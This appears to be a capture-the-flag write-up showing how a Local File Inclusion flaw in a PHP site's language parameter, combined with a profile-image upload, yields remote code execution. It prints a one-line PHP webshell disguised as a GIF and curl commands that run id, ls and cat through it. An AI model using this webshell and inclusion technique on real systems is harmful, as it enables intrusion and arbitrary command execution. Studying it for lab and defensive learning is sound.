# LFI and Webshell Exploit Write-Up (Target: 94.237.58.135:51980)
This repository documents the exploitation of a Local File Inclusion (LFI) vulnerability combined with a file upload on the web server at `94.237.58.135:51980` to achieve remote code execution (RCE) and locate a flag in a Capture The Flag (CTF) challenge.

## Overview
The target web application at `http://94.237.58.135:51980/index.php` has an LFI vulnerability in the language parameter, allowing inclusion of local PHP files. By uploading a malicious PHP script (`shell.gif`) to `./profile_images/`, I executed commands and found the flag in `/2f40d853e2d4768d87da1c81772bae0a.txt`.

## Prerequisites
A Linux machine with curl.

A malicious PHP script (shell.gif).

Network access to the target (94.237.58.135:51980).

## Steps
### Step 1: Identify Local File Inclusion (LFI)

I noticed the `index.php` page used a language parameter to include files (`index.php?language=en.php`). I tested for LFI by attempting to include files from the server’s filesystem.

```bash
curl -s "http://94.237.58.135:51980/index.php?language=./profile_images/shell.gif"
```
The server included files from `./profile_images/`, suggesting an LFI vulnerability. I realized I could upload a PHP script to this directory and include it.

### Step 2: Create and Upload the Malicious PHP Script

I created a PHP webshell to execute system commands:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.gif
```
This created a clean PHP webshell that runs commands via the `cmd` parameter.

I accessed the /settings.php page, which had a profile image upload feature.

I uploaded `shell.gif` to `./profile_images/` through the web interface, placing it at `http://94.237.58.135:51980/profile_images/shell.gif`

![image](https://github.com/user-attachments/assets/53fa8646-73f1-4d9d-9931-75c58fcb158e)

### Step 3: Verify Remote Code Execution

I tested the LFI vulnerability by including `shell.gif` and running the `id` command.
```bash
curl -s "http://94.237.58.135:51980/index.php?language=./profile_images/shell.gif&cmd=id" | grep uid
```
![image](https://github.com/user-attachments/assets/092f7162-58ec-42e9-95f1-289a4db74c1e)

This confirmed RCE as the `www-data` user, proving my webshell worked.

### Step 4: Explore the File System

I listed the root directory to find the flag’s location.

```bash
curl -s "http://94.237.58.135:51980/index.php?language=./profile_images/shell.gif&cmd=ls%20/"
```
![image](https://github.com/user-attachments/assets/be40b260-a7fd-47e2-ab37-cc3503b15c45)

### Step 5: Locate the Flag
```bash
curl -s "http://94.237.58.135:51980/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt"
```
I got the flag and completed the challenge!
